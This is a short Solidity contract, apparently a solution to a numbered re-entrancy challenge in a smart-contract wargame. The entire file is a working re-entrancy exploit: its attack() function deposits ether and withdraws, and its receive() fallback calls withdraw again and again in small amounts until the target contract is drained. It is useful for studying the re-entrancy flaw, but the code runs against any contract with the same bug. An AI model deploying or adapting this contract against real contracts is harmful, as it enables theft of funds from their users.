// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import "./10-re-entrancy.sol";
import "interfaces/ire-entrancy.sol";

contract Attack10 {
    ReentrantInterface reentrance;

    constructor(address _reEntrancyAddress) public {
        reentrance = ReentrantInterface(_reEntrancyAddress);
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(reentrance).balance;

        if (targetBalance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
